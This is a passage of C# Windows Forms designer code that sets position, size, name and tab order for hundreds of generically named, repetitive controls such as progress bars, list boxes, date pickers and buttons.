			this.ProgressBar50.Name = "ProgressBar50";
			this.ProgressBar50.Size = new Size(40, 96);
			this.ProgressBar50.TabIndex = 595;
			this.DateTimePicker25.Location = new Point(627, 238);
			this.DateTimePicker25.Name = "DateTimePicker25";
			this.DateTimePicker25.Size = new Size(85, 20);
			this.DateTimePicker25.TabIndex = 594;
			this.CheckedListBox37.FormattingEnabled = true;
			this.CheckedListBox37.Location = new Point(402, 70);
			this.CheckedListBox37.Name = "CheckedListBox37";
			this.CheckedListBox37.Size = new Size(151, 49);
			this.CheckedListBox37.TabIndex = 593;
			this.ListBox37.FormattingEnabled = true;
			this.ListBox37.Location = new Point(674, 147);
			this.ListBox37.Name = "ListBox37";
			this.ListBox37.Size = new Size(49, 69);
			this.ListBox37.TabIndex = 592;
			this.DateTimePicker26.Location = new Point(624, 59);
			this.DateTimePicker26.Name = "DateTimePicker26";
			this.DateTimePicker26.Size = new Size(52, 20);
			this.DateTimePicker26.TabIndex = 591;
			this.ListBox38.FormattingEnabled = true;
			this.ListBox38.Location = new Point(692, 78);
			this.ListBox38.Name = "ListBox38";
			this.ListBox38.Size = new Size(47, 4);
			this.ListBox38.TabIndex = 590;
			this.Label13.AutoSize = true;
			this.Label13.Location = new Point(479, 251);
			this.Label13.Name = "Label13";
			this.Label13.Size = new Size(45, 13);
			this.Label13.TabIndex = 589;
			this.Label13.Text = "Label13";
			this.MaskedTextBox25.Location = new Point(337, 196);
			this.MaskedTextBox25.Name = "MaskedTextBox25";
			this.MaskedTextBox25.Size = new Size(83, 20);
			this.MaskedTextBox25.TabIndex = 588;
			this.RadioButton25.AutoSize = true;
			this.RadioButton25.Location = new Point(464, 218);
			this.RadioButton25.Name = "RadioButton25";
			this.RadioButton25.Size = new Size(96, 17);
			this.RadioButton25.TabIndex = 587;
			this.RadioButton25.TabStop = true;
			this.RadioButton25.Text = "RadioButton25";
			this.RadioButton25.UseVisualStyleBackColor = true;
			this.PictureBox25.Location = new Point(306, 298);
			this.PictureBox25.Name = "PictureBox25";
			this.PictureBox25.Size = new Size(20, 20);
			this.PictureBox25.TabIndex = 586;
			this.PictureBox25.TabStop = false;
			this.MaskedTextBox26.Location = new Point(326, 251);
			this.MaskedTextBox26.Name = "MaskedTextBox26";
			this.MaskedTextBox26.Size = new Size(141, 20);
			this.MaskedTextBox26.TabIndex = 585;
			this.WebBrowser13.Location = new Point(467, 181);
			this.WebBrowser13.MinimumSize = new Size(20, 20);
			this.WebBrowser13.Name = "WebBrowser13";
			this.WebBrowser13.Size = new Size(69, 20);
			this.WebBrowser13.TabIndex = 584;
			this.TreeView13.Location = new Point(214, 227);
			this.TreeView13.Name = "TreeView13";
			this.TreeView13.Size = new Size(183, 112);
			this.TreeView13.TabIndex = 583;
			this.PictureBox26.Location = new Point(511, 218);
			this.PictureBox26.Name = "PictureBox26";
			this.PictureBox26.Size = new Size(166, 43);
			this.PictureBox26.TabIndex = 582;
			this.PictureBox26.TabStop = false;
			this.NumericUpDown13.Location = new Point(125, 314);
			this.NumericUpDown13.Name = "NumericUpDown13";
			this.NumericUpDown13.Size = new Size(78, 20);
			this.NumericUpDown13.TabIndex = 581;
			this.ProgressBar51.Location = new Point(45, 276);
			this.ProgressBar51.Name = "ProgressBar51";
			this.ProgressBar51.Size = new Size(74, 44);
			this.ProgressBar51.TabIndex = 580;
			this.RadioButton26.AutoSize = true;
			this.RadioButton26.Location = new Point(70, 348);
			this.RadioButton26.Name = "RadioButton26";
			this.RadioButton26.Size = new Size(96, 17);
			this.RadioButton26.TabIndex = 579;
			this.RadioButton26.TabStop = true;
			this.RadioButton26.Text = "RadioButton26";
			this.RadioButton26.UseVisualStyleBackColor = true;
			this.LinkLabel37.AutoSize = true;
			this.LinkLabel37.Location = new Point(32, 277);
			this.LinkLabel37.Name = "LinkLabel37";
			this.LinkLabel37.Size = new Size(65, 13);
			this.LinkLabel37.TabIndex = 578;
			this.LinkLabel37.TabStop = true;
			this.LinkLabel37.Text = "LinkLabel37";
			this.CheckBox25.AutoSize = true;
			this.CheckBox25.Location = new Point(168, 128);
			this.CheckBox25.Name = "CheckBox25";
			this.CheckBox25.Size = new Size(87, 17);
			this.CheckBox25.TabIndex = 577;
			this.CheckBox25.Text = "CheckBox25";
			this.CheckBox25.UseVisualStyleBackColor = true;
			this.ComboBox25.FormattingEnabled = true;
			this.ComboBox25.Location = new Point(159, 89);
			this.ComboBox25.Name = "ComboBox25";
			this.ComboBox25.Size = new Size(115, 21);
			this.ComboBox25.TabIndex = 576;
			this.Button25.Location = new Point(536, 196);
			this.Button25.Name = "Button25";
			this.Button25.Size = new Size(75, 23);
			this.Button25.TabIndex = 575;
			this.Button25.Text = "Button25";
			this.Button25.UseVisualStyleBackColor = true;
			this.CheckedListBox38.FormattingEnabled = true;
			this.CheckedListBox38.Location = new Point(35, 209);
			this.CheckedListBox38.Name = "CheckedListBox38";
			this.CheckedListBox38.Size = new Size(222, 4);
			this.CheckedListBox38.TabIndex = 574;
			this.ComboBox26.FormattingEnabled = true;
			this.ComboBox26.Location = new Point(157, 120);
			this.ComboBox26.Name = "ComboBox26";
			this.ComboBox26.Size = new Size(101, 21);
			this.ComboBox26.TabIndex = 573;
			this.MonthCalendar27.Location = new Point(93, 159);
			this.MonthCalendar27.Name = "MonthCalendar27";
			this.MonthCalendar27.TabIndex = 572;
			this.MonthCalendar28.Location = new Point(420, 282);
			this.MonthCalendar28.Name = "MonthCalendar28";
			this.MonthCalendar28.TabIndex = 571;
			this.LinkLabel38.AutoSize = true;
			this.LinkLabel38.Location = new Point(100, 90);
			this.LinkLabel38.Name = "LinkLabel38";
			this.LinkLabel38.Size = new Size(65, 13);
			this.LinkLabel38.TabIndex = 570;
			this.LinkLabel38.TabStop = true;
			this.LinkLabel38.Text = "LinkLabel38";
			this.ProgressBar52.Location = new Point(71, 178);
			this.ProgressBar52.Name = "ProgressBar52";
			this.ProgressBar52.Size = new Size(93, 107);
			this.ProgressBar52.TabIndex = 569;
			this.LinkLabel39.AutoSize = true;
			this.LinkLabel39.Location = new Point(451, 264);
			this.LinkLabel39.Name = "LinkLabel39";
			this.LinkLabel39.Size = new Size(65, 13);
			this.LinkLabel39.TabIndex = 568;
			this.LinkLabel39.TabStop = true;
			this.LinkLabel39.Text = "LinkLabel39";
			this.ListBox39.FormattingEnabled = true;
			this.ListBox39.Location = new Point(258, 329);
			this.ListBox39.Name = "ListBox39";
			this.ListBox39.Size = new Size(165, 69);
			this.ListBox39.TabIndex = 567;
			this.CheckBox26.AutoSize = true;
			this.CheckBox26.Location = new Point(148, 298);
			this.CheckBox26.Name = "CheckBox26";
			this.CheckBox26.Size = new Size(87, 17);
			this.CheckBox26.TabIndex = 566;
			this.CheckBox26.Text = "CheckBox26";
			this.CheckBox26.UseVisualStyleBackColor = true;
			this.CheckedListBox39.FormattingEnabled = true;
			this.CheckedListBox39.Location = new Point(309, 133);
			this.CheckedListBox39.Name = "CheckedListBox39";
			this.CheckedListBox39.Size = new Size(303, 49);
			this.CheckedListBox39.TabIndex = 565;
			this.Button26.Location = new Point(227, 178);
			this.Button26.Name = "Button26";
			this.Button26.Size = new Size(156, 50);
			this.Button26.TabIndex = 564;
			this.Button26.Text = "Button26";
			this.Button26.UseVisualStyleBackColor = true;
			this.ProgressBar53.Location = new Point(28, 97);
			this.ProgressBar53.Name = "ProgressBar53";
			this.ProgressBar53.Size = new Size(57, 54);
			this.ProgressBar53.TabIndex = 563;
			this.ProgressBar54.Location = new Point(674, 280);
			this.ProgressBar54.Name = "ProgressBar54";
			this.ProgressBar54.Size = new Size(40, 96);
			this.ProgressBar54.TabIndex = 562;
			this.DateTimePicker27.Location = new Point(619, 230);
			this.DateTimePicker27.Name = "DateTimePicker27";
			this.DateTimePicker27.Size = new Size(85, 20);
			this.DateTimePicker27.TabIndex = 561;
			this.CheckedListBox40.FormattingEnabled = true;
			this.CheckedListBox40.Location = new Point(394, 62);
			this.CheckedListBox40.Name = "CheckedListBox40";
			this.CheckedListBox40.Size = new Size(151, 49);
			this.CheckedListBox40.TabIndex = 560;
			this.ListBox40.FormattingEnabled = true;
			this.ListBox40.Location = new Point(666, 139);
			this.ListBox40.Name = "ListBox40";
			this.ListBox40.Size = new Size(49, 69);
			this.ListBox40.TabIndex = 559;
			this.DateTimePicker28.Location = new Point(616, 51);
			this.DateTimePicker28.Name = "DateTimePicker28";
			this.DateTimePicker28.Size = new Size(52, 20);
			this.DateTimePicker28.TabIndex = 558;
			this.ListBox41.FormattingEnabled = true;
			this.ListBox41.Location = new Point(684, 70);
			this.ListBox41.Name = "ListBox41";
			this.ListBox41.Size = new Size(47, 4);
			this.ListBox41.TabIndex = 557;
			this.Label14.AutoSize = true;
			this.Label14.Location = new Point(471, 243);
			this.Label14.Name = "Label14";
			this.Label14.Size = new Size(45, 13);
			this.Label14.TabIndex = 556;
			this.Label14.Text = "Label14";
			this.MaskedTextBox27.Location = new Point(329, 188);
			this.MaskedTextBox27.Name = "MaskedTextBox27";
			this.MaskedTextBox27.Size = new Size(83, 20);
			this.MaskedTextBox27.TabIndex = 555;
			this.RadioButton27.AutoSize = true;
			this.RadioButton27.Location = new Point(456, 210);
			this.RadioButton27.Name = "RadioButton27";
			this.RadioButton27.Size = new Size(96, 17);
			this.RadioButton27.TabIndex = 554;
			this.RadioButton27.TabStop = true;
			this.RadioButton27.Text = "RadioButton27";
			this.RadioButton27.UseVisualStyleBackColor = true;
			this.PictureBox27.Location = new Point(298, 290);
			this.PictureBox27.Name = "PictureBox27";
			this.PictureBox27.Size = new Size(20, 20);
			this.PictureBox27.TabIndex = 553;
			this.PictureBox27.TabStop = false;
			this.MaskedTextBox28.Location = new Point(318, 243);
			this.MaskedTextBox28.Name = "MaskedTextBox28";
			this.MaskedTextBox28.Size = new Size(141, 20);
			this.MaskedTextBox28.TabIndex = 552;
			this.WebBrowser14.Location = new Point(459, 173);
			this.WebBrowser14.MinimumSize = new Size(20, 20);
			this.WebBrowser14.Name = "WebBrowser14";
			this.WebBrowser14.Size = new Size(69, 20);
			this.WebBrowser14.TabIndex = 551;
			this.TreeView14.Location = new Point(206, 219);
			this.TreeView14.Name = "TreeView14";
			this.TreeView14.Size = new Size(183, 112);
			this.TreeView14.TabIndex = 550;
			this.PictureBox28.Location = new Point(503, 210);
			this.PictureBox28.Name = "PictureBox28";
			this.PictureBox28.Size = new Size(166, 43);
			this.PictureBox28.TabIndex = 549;
			this.PictureBox28.TabStop = false;
			this.NumericUpDown14.Location = new Point(117, 306);
			this.NumericUpDown14.Name = "NumericUpDown14";
			this.NumericUpDown14.Size = new Size(78, 20);
			this.NumericUpDown14.TabIndex = 548;
			this.ProgressBar55.Location = new Point(37, 268);
			this.ProgressBar55.Name = "ProgressBar55";
			this.ProgressBar55.Size = new Size(74, 44);
			this.ProgressBar55.TabIndex = 547;
			this.RadioButton28.AutoSize = true;
			this.RadioButton28.Location = new Point(62, 340);
			this.RadioButton28.Name = "RadioButton28";
			this.RadioButton28.Size = new Size(96, 17);
			this.RadioButton28.TabIndex = 546;
			this.RadioButton28.TabStop = true;
			this.RadioButton28.Text = "RadioButton28";
			this.RadioButton28.UseVisualStyleBackColor = true;
			this.LinkLabel40.AutoSize = true;
			this.LinkLabel40.Location = new Point(24, 269);
			this.LinkLabel40.Name = "LinkLabel40";
			this.LinkLabel40.Size = new Size(65, 13);
			this.LinkLabel40.TabIndex = 545;
			this.LinkLabel40.TabStop = true;
			this.LinkLabel40.Text = "LinkLabel40";
			this.CheckBox27.AutoSize = true;
			this.CheckBox27.Location = new Point(160, 120);
			this.CheckBox27.Name = "CheckBox27";
			this.CheckBox27.Size = new Size(87, 17);
			this.CheckBox27.TabIndex = 544;
			this.CheckBox27.Text = "CheckBox27";
			this.CheckBox27.UseVisualStyleBackColor = true;
			this.ComboBox27.FormattingEnabled = true;
			this.ComboBox27.Location = new Point(151, 81);
			this.ComboBox27.Name = "ComboBox27";
			this.ComboBox27.Size = new Size(115, 21);
			this.ComboBox27.TabIndex = 543;
			this.Button27.Location = new Point(528, 188);
			this.Button27.Name = "Button27";
			this.Button27.Size = new Size(75, 23);
			this.Button27.TabIndex = 542;
			this.Button27.Text = "Button27";
			this.Button27.UseVisualStyleBackColor = true;
			this.CheckedListBox41.FormattingEnabled = true;
			this.CheckedListBox41.Location = new Point(27, 201);
			this.CheckedListBox41.Name = "CheckedListBox41";
			this.CheckedListBox41.Size = new Size(222, 4);
			this.CheckedListBox41.TabIndex = 541;
			this.ComboBox28.FormattingEnabled = true;
			this.ComboBox28.Location = new Point(149, 112);
			this.ComboBox28.Name = "ComboBox28";
			this.ComboBox28.Size = new Size(101, 21);
			this.ComboBox28.TabIndex = 540;
			this.MonthCalendar29.Location = new Point(85, 151);
			this.MonthCalendar29.Name = "MonthCalendar29";
			this.MonthCalendar29.TabIndex = 539;
			this.MonthCalendar30.Location = new Point(412, 274);
			this.MonthCalendar30.Name = "MonthCalendar30";
			this.MonthCalendar30.TabIndex = 538;
			this.LinkLabel41.AutoSize = true;
			this.LinkLabel41.Location = new Point(92, 82);
			this.LinkLabel41.Name = "LinkLabel41";
			this.LinkLabel41.Size = new Size(65, 13);
			this.LinkLabel41.TabIndex = 537;
			this.LinkLabel41.TabStop = true;
			this.LinkLabel41.Text = "LinkLabel41";
			this.ProgressBar56.Location = new Point(63, 170);
			this.ProgressBar56.Name = "ProgressBar56";
			this.ProgressBar56.Size = new Size(93, 107);
			this.ProgressBar56.TabIndex = 536;
			this.LinkLabel42.AutoSize = true;
			this.LinkLabel42.Location = new Point(443, 256);
			this.LinkLabel42.Name = "LinkLabel42";
			this.LinkLabel42.Size = new Size(65, 13);
			this.LinkLabel42.TabIndex = 535;
			this.LinkLabel42.TabStop = true;
			this.LinkLabel42.Text = "LinkLabel42";
			this.ListBox42.FormattingEnabled = true;
			this.ListBox42.Location = new Point(250, 321);
			this.ListBox42.Name = "ListBox42";
			this.ListBox42.Size = new Size(165, 69);
			this.ListBox42.TabIndex = 534;
			this.CheckBox28.AutoSize = true;
			this.CheckBox28.Location = new Point(140, 290);
			this.CheckBox28.Name = "CheckBox28";
			this.CheckBox28.Size = new Size(87, 17);
			this.CheckBox28.TabIndex = 533;
			this.CheckBox28.Text = "CheckBox28";
			this.CheckBox28.UseVisualStyleBackColor = true;
			this.CheckedListBox42.FormattingEnabled = true;
			this.CheckedListBox42.Location = new Point(301, 125);
			this.CheckedListBox42.Name = "CheckedListBox42";
			this.CheckedListBox42.Size = new Size(303, 49);
			this.CheckedListBox42.TabIndex = 532;
			this.Button28.Location = new Point(219, 170);
			this.Button28.Name = "Button28";
			this.Button28.Size = new Size(156, 50);
			this.Button28.TabIndex = 531;
			this.Button28.Text = "Button28";
			this.Button28.UseVisualStyleBackColor = true;
			this.ProgressBar57.Location = new Point(20, 89);
			this.ProgressBar57.Name = "ProgressBar57";
			this.ProgressBar57.Size = new Size(57, 54);
			this.ProgressBar57.TabIndex = 530;
			this.ProgressBar58.Location = new Point(666, 272);
			this.ProgressBar58.Name = "ProgressBar58";
			this.ProgressBar58.Size = new Size(40, 96);
			this.ProgressBar58.TabIndex = 529;
			this.DateTimePicker29.Location = new Point(611, 222);
			this.DateTimePicker29.Name = "DateTimePicker29";
			this.DateTimePicker29.Size = new Size(85, 20);
			this.DateTimePicker29.TabIndex = 528;
			this.CheckedListBox43.FormattingEnabled = true;
			this.CheckedListBox43.Location = new Point(386, 54);
			this.CheckedListBox43.Name = "CheckedListBox43";
			this.CheckedListBox43.Size = new Size(151, 49);
			this.CheckedListBox43.TabIndex = 527;
			this.ListBox43.FormattingEnabled = true;
			this.ListBox43.Location = new Point(658, 131);
			this.ListBox43.Name = "ListBox43";
			this.ListBox43.Size = new Size(49, 69);
			this.ListBox43.TabIndex = 526;
			this.DateTimePicker30.Location = new Point(608, 43);
			this.DateTimePicker30.Name = "DateTimePicker30";
			this.DateTimePicker30.Size = new Size(52, 20);
			this.DateTimePicker30.TabIndex = 525;
			this.ListBox44.FormattingEnabled = true;
			this.ListBox44.Location = new Point(676, 62);
			this.ListBox44.Name = "ListBox44";
			this.ListBox44.Size = new Size(47, 4);
			this.ListBox44.TabIndex = 524;
			this.Label15.AutoSize = true;
			this.Label15.Location = new Point(463, 235);
			this.Label15.Name = "Label15";
			this.Label15.Size = new Size(45, 13);
			this.Label15.TabIndex = 523;
			this.Label15.Text = "Label15";
			this.MaskedTextBox29.Location = new Point(321, 180);
			this.MaskedTextBox29.Name = "MaskedTextBox29";
			this.MaskedTextBox29.Size = new Size(83, 20);
			this.MaskedTextBox29.TabIndex = 522;
			this.RadioButton29.AutoSize = true;
			this.RadioButton29.Location = new Point(448, 202);
			this.RadioButton29.Name = "RadioButton29";
			this.RadioButton29.Size = new Size(96, 17);
			this.RadioButton29.TabIndex = 521;
			this.RadioButton29.TabStop = true;
			this.RadioButton29.Text = "RadioButton29";
			this.RadioButton29.UseVisualStyleBackColor = true;
			this.PictureBox29.Location = new Point(290, 282);
			this.PictureBox29.Name = "PictureBox29";
			this.PictureBox29.Size = new Size(20, 20);
			this.PictureBox29.TabIndex = 520;
			this.PictureBox29.TabStop = false;
			this.MaskedTextBox30.Location = new Point(310, 235);
			this.MaskedTextBox30.Name = "MaskedTextBox30";
			this.MaskedTextBox30.Size = new Size(141, 20);
			this.MaskedTextBox30.TabIndex = 519;
			this.WebBrowser15.Location = new Point(451, 165);
			this.WebBrowser15.MinimumSize = new Size(20, 20);
			this.WebBrowser15.Name = "WebBrowser15";
			this.WebBrowser15.Size = new Size(69, 20);
			this.WebBrowser15.TabIndex = 518;
			this.TreeView15.Location = new Point(198, 211);
			this.TreeView15.Name = "TreeView15";
			this.TreeView15.Size = new Size(183, 112);
			this.TreeView15.TabIndex = 517;
			this.PictureBox30.Location = new Point(495, 202);
			this.PictureBox30.Name = "PictureBox30";
			this.PictureBox30.Size = new Size(166, 43);
			this.PictureBox30.TabIndex = 516;
			this.PictureBox30.TabStop = false;
			this.NumericUpDown15.Location = new Point(109, 298);
			this.NumericUpDown15.Name = "NumericUpDown15";
			this.NumericUpDown15.Size = new Size(78, 20);
			this.NumericUpDown15.TabIndex = 515;
			this.ProgressBar59.Location = new Point(29, 260);
			this.ProgressBar59.Name = "ProgressBar59";
			this.ProgressBar59.Size = new Size(74, 44);
			this.ProgressBar59.TabIndex = 514;
			this.RadioButton30.AutoSize = true;
			this.RadioButton30.Location = new Point(54, 332);
			this.RadioButton30.Name = "RadioButton30";
			this.RadioButton30.Size = new Size(96, 17);
			this.RadioButton30.TabIndex = 513;
			this.RadioButton30.TabStop = true;
			this.RadioButton30.Text = "RadioButton30";
			this.RadioButton30.UseVisualStyleBackColor = true;
			this.LinkLabel43.AutoSize = true;
			this.LinkLabel43.Location = new Point(16, 261);
			this.LinkLabel43.Name = "LinkLabel43";
			this.LinkLabel43.Size = new Size(65, 13);
			this.LinkLabel43.TabIndex = 512;
			this.LinkLabel43.TabStop = true;
			this.LinkLabel43.Text = "LinkLabel43";
			this.CheckBox29.AutoSize = true;
			this.CheckBox29.Location = new Point(152, 112);
			this.CheckBox29.Name = "CheckBox29";
			this.CheckBox29.Size = new Size(87, 17);
			this.CheckBox29.TabIndex = 511;
			this.CheckBox29.Text = "CheckBox29";
			this.CheckBox29.UseVisualStyleBackColor = true;
			this.ComboBox29.FormattingEnabled = true;
			this.ComboBox29.Location = new Point(143, 73);
			this.ComboBox29.Name = "ComboBox29";
			this.ComboBox29.Size = new Size(115, 21);
			this.ComboBox29.TabIndex = 510;
			this.Button29.Location = new Point(520, 180);
			this.Button29.Name = "Button29";
			this.Button29.Size = new Size(75, 23);
			this.Button29.TabIndex = 509;
			this.Button29.Text = "Button29";
			this.Button29.UseVisualStyleBackColor = true;
			this.CheckedListBox44.FormattingEnabled = true;
			this.CheckedListBox44.Location = new Point(19, 193);
			this.CheckedListBox44.Name = "CheckedListBox44";
			this.CheckedListBox44.Size = new Size(222, 4);
			this.CheckedListBox44.TabIndex = 508;
			this.ComboBox30.FormattingEnabled = true;
			this.ComboBox30.Location = new Point(141, 104);
			this.ComboBox30.Name = "ComboBox30";
			this.ComboBox30.Size = new Size(101, 21);
			this.ComboBox30.TabIndex = 507;
			this.MonthCalendar31.Location = new Point(77, 143);
			this.MonthCalendar31.Name = "MonthCalendar31";
			this.MonthCalendar31.TabIndex = 506;
			this.MonthCalendar32.Location = new Point(404, 266);
			this.MonthCalendar32.Name = "MonthCalendar32";
			this.MonthCalendar32.TabIndex = 505;
			this.LinkLabel44.AutoSize = true;
			this.LinkLabel44.Location = new Point(84, 74);
			this.LinkLabel44.Name = "LinkLabel44";
			this.LinkLabel44.Size = new Size(65, 13);
			this.LinkLabel44.TabIndex = 504;
			this.LinkLabel44.TabStop = true;
			this.LinkLabel44.Text = "LinkLabel44";
			this.ProgressBar60.Location = new Point(55, 162);
			this.ProgressBar60.Name = "ProgressBar60";
			this.ProgressBar60.Size = new Size(93, 107);
			this.ProgressBar60.TabIndex = 503;
			this.LinkLabel45.AutoSize = true;
			this.LinkLabel45.Location = new Point(435, 248);
			this.LinkLabel45.Name = "LinkLabel45";
			this.LinkLabel45.Size = new Size(65, 13);
			this.LinkLabel45.TabIndex = 502;
			this.LinkLabel45.TabStop = true;
			this.LinkLabel45.Text = "LinkLabel45";
			this.ListBox45.FormattingEnabled = true;
			this.ListBox45.Location = new Point(242, 313);
			this.ListBox45.Name = "ListBox45";
			this.ListBox45.Size = new Size(165, 69);
			this.ListBox45.TabIndex = 501;
			this.CheckBox30.AutoSize = true;
			this.CheckBox30.Location = new Point(132, 282);
			this.CheckBox30.Name = "CheckBox30";
			this.CheckBox30.Size = new Size(87, 17);
			this.CheckBox30.TabIndex = 500;
			this.CheckBox30.Text = "CheckBox30";
			this.CheckBox30.UseVisualStyleBackColor = true;
			this.CheckedListBox45.FormattingEnabled = true;
			this.CheckedListBox45.Location = new Point(293, 117);
			this.CheckedListBox45.Name = "CheckedListBox45";
			this.CheckedListBox45.Size = new Size(303, 49);
			this.CheckedListBox45.TabIndex = 499;
			this.Button30.Location = new Point(211, 162);
			this.Button30.Name = "Button30";
			this.Button30.Size = new Size(156, 50);
			this.Button30.TabIndex = 498;
			this.Button30.Text = "Button30";
			this.Button30.UseVisualStyleBackColor = true;
			this.ProgressBar61.Location = new Point(12, 81);
			this.ProgressBar61.Name = "ProgressBar61";
			this.ProgressBar61.Size = new Size(57, 54);
			this.ProgressBar61.TabIndex = 497;
			this.ProgressBar62.Location = new Point(658, 264);
			this.ProgressBar62.Name = "ProgressBar62";
			this.ProgressBar62.Size = new Size(40, 96);
			this.ProgressBar62.TabIndex = 496;
			this.DateTimePicker31.Location = new Point(603, 214);
			this.DateTimePicker31.Name = "DateTimePicker31";
			this.DateTimePicker31.Size = new Size(85, 20);
			this.DateTimePicker31.TabIndex = 495;
			this.CheckedListBox46.FormattingEnabled = true;
			this.CheckedListBox46.Location = new Point(378, 46);
			this.CheckedListBox46.Name = "CheckedListBox46";
			this.CheckedListBox46.Size = new Size(151, 49);
			this.CheckedListBox46.TabIndex = 494;
			this.ListBox46.FormattingEnabled = true;
			this.ListBox46.Location = new Point(650, 123);
			this.ListBox46.Name = "ListBox46";
			this.ListBox46.Size = new Size(49, 69);
			this.ListBox46.TabIndex = 493;
			this.DateTimePicker32.Location = new Point(600, 35);
			this.DateTimePicker32.Name = "DateTimePicker32";
			this.DateTimePicker32.Size = new Size(52, 20);
			this.DateTimePicker32.TabIndex = 492;
			this.ListBox47.FormattingEnabled = true;
			this.ListBox47.Location = new Point(668, 54);
			this.ListBox47.Name = "ListBox47";
			this.ListBox47.Size = new Size(47, 4);
			this.ListBox47.TabIndex = 491;
			this.Label16.AutoSize = true;
			this.Label16.Location = new Point(455, 227);
			this.Label16.Name = "Label16";
			this.Label16.Size = new Size(45, 13);
			this.Label16.TabIndex = 490;
			this.Label16.Text = "Label16";
			this.MaskedTextBox31.Location = new Point(313, 172);
			this.MaskedTextBox31.Name = "MaskedTextBox31";
			this.MaskedTextBox31.Size = new Size(83, 20);
			this.MaskedTextBox31.TabIndex = 489;
			this.RadioButton31.AutoSize = true;
			this.RadioButton31.Location = new Point(440, 194);
			this.RadioButton31.Name = "RadioButton31";
			this.RadioButton31.Size = new Size(96, 17);
			this.RadioButton31.TabIndex = 488;
			this.RadioButton31.TabStop = true;
			this.RadioButton31.Text = "RadioButton31";
			this.RadioButton31.UseVisualStyleBackColor = true;
			this.PictureBox31.Location = new Point(282, 274);
			this.PictureBox31.Name = "PictureBox31";
			this.PictureBox31.Size = new Size(20, 20);
			this.PictureBox31.TabIndex = 487;
			this.PictureBox31.TabStop = false;
			this.MaskedTextBox32.Location = new Point(302, 227);
			this.MaskedTextBox32.Name = "MaskedTextBox32";
			this.MaskedTextBox32.Size = new Size(141, 20);
			this.MaskedTextBox32.TabIndex = 486;
			this.WebBrowser16.Location = new Point(443, 157);
			this.WebBrowser16.MinimumSize = new Size(20, 20);
			this.WebBrowser16.Name = "WebBrowser16";
			this.WebBrowser16.Size = new Size(69, 20);
			this.WebBrowser16.TabIndex = 485;
			this.TreeView16.Location = new Point(190, 203);
			this.TreeView16.Name = "TreeView16";
			this.TreeView16.Size = new Size(183, 112);
			this.TreeView16.TabIndex = 484;
			this.PictureBox32.Location = new Point(487, 194);
			this.PictureBox32.Name = "PictureBox32";
			this.PictureBox32.Size = new Size(166, 43);
			this.PictureBox32.TabIndex = 483;
			this.PictureBox32.TabStop = false;
			this.NumericUpDown16.Location = new Point(101, 290);
			this.NumericUpDown16.Name = "NumericUpDown16";
			this.NumericUpDown16.Size = new Size(78, 20);
			this.NumericUpDown16.TabIndex = 482;
			this.ProgressBar63.Location = new Point(21, 252);
			this.ProgressBar63.Name = "ProgressBar63";
			this.ProgressBar63.Size = new Size(74, 44);
			this.ProgressBar63.TabIndex = 481;
			this.RadioButton32.AutoSize = true;
			this.RadioButton32.Location = new Point(46, 324);
			this.RadioButton32.Name = "RadioButton32";
			this.RadioButton32.Size = new Size(96, 17);
			this.RadioButton32.TabIndex = 480;
			this.RadioButton32.TabStop = true;
			this.RadioButton32.Text = "RadioButton32";
			this.RadioButton32.UseVisualStyleBackColor = true;
			this.LinkLabel46.AutoSize = true;
			this.LinkLabel46.Location = new Point(8, 253);
			this.LinkLabel46.Name = "LinkLabel46";
			this.LinkLabel46.Size = new Size(65, 13);
			this.LinkLabel46.TabIndex = 479;
			this.LinkLabel46.TabStop = true;
			this.LinkLabel46.Text = "LinkLabel46";
			this.CheckBox31.AutoSize = true;
			this.CheckBox31.Location = new Point(144, 104);
			this.CheckBox31.Name = "CheckBox31";
			this.CheckBox31.Size = new Size(87, 17);
			this.CheckBox31.TabIndex = 478;
			this.CheckBox31.Text = "CheckBox31";
			this.CheckBox31.UseVisualStyleBackColor = true;
			this.ComboBox31.FormattingEnabled = true;
			this.ComboBox31.Location = new Point(135, 65);
			this.ComboBox31.Name = "ComboBox31";
			this.ComboBox31.Size = new Size(115, 21);
			this.ComboBox31.TabIndex = 477;
			this.Button31.Location = new Point(512, 172);
			this.Button31.Name = "Button31";
			this.Button31.Size = new Size(75, 23);
			this.Button31.TabIndex = 476;
			this.Button31.Text = "Button31";
			this.Button31.UseVisualStyleBackColor = true;
			this.CheckedListBox47.FormattingEnabled = true;
			this.CheckedListBox47.Location = new Point(11, 185);
			this.CheckedListBox47.Name = "CheckedListBox47";
			this.CheckedListBox47.Size = new Size(222, 4);
			this.CheckedListBox47.TabIndex = 475;
			this.ComboBox32.FormattingEnabled = true;
			this.ComboBox32.Location = new Point(133, 96);
			this.ComboBox32.Name = "ComboBox32";
			this.ComboBox32.Size = new Size(101, 21);
			this.ComboBox32.TabIndex = 474;
			this.MonthCalendar33.Location = new Point(69, 135);
			this.MonthCalendar33.Name = "MonthCalendar33";
			this.MonthCalendar33.TabIndex = 473;
			this.MonthCalendar34.Location = new Point(396, 258);
			this.MonthCalendar34.Name = "MonthCalendar34";
			this.MonthCalendar34.TabIndex = 472;
			this.LinkLabel47.AutoSize = true;
			this.LinkLabel47.Location = new Point(76, 66);
			this.LinkLabel47.Name = "LinkLabel47";
			this.LinkLabel47.Size = new Size(65, 13);
			this.LinkLabel47.TabIndex = 471;
			this.LinkLabel47.TabStop = true;
			this.LinkLabel47.Text = "LinkLabel47";
			this.ProgressBar64.Location = new Point(47, 154);
			this.ProgressBar64.Name = "ProgressBar64";
			this.ProgressBar64.Size = new Size(93, 107);
			this.ProgressBar64.TabIndex = 470;
			this.LinkLabel48.AutoSize = true;
			this.LinkLabel48.Location = new Point(427, 240);
			this.LinkLabel48.Name = "LinkLabel48";
			this.LinkLabel48.Size = new Size(65, 13);
			this.LinkLabel48.TabIndex = 469;
			this.LinkLabel48.TabStop = true;
			this.LinkLabel48.Text = "LinkLabel48";
			this.ListBox48.FormattingEnabled = true;
			this.ListBox48.Location = new Point(234, 305);
			this.ListBox48.Name = "ListBox48";
			this.ListBox48.Size = new Size(165, 69);
			this.ListBox48.TabIndex = 468;
			this.CheckBox32.AutoSize = true;
			this.CheckBox32.Location = new Point(124, 274);
			this.CheckBox32.Name = "CheckBox32";
			this.CheckBox32.Size = new Size(87, 17);
			this.CheckBox32.TabIndex = 467;
			this.CheckBox32.Text = "CheckBox32";
			this.CheckBox32.UseVisualStyleBackColor = true;
			this.CheckedListBox48.FormattingEnabled = true;
			this.CheckedListBox48.Location = new Point(285, 109);
			this.CheckedListBox48.Name = "CheckedListBox48";
			this.CheckedListBox48.Size = new Size(303, 49);
			this.CheckedListBox48.TabIndex = 466;
			this.Button32.Location = new Point(203, 154);
			this.Button32.Name = "Button32";
			this.Button32.Size = new Size(156, 50);
			this.Button32.TabIndex = 465;
			this.Button32.Text = "Button32";
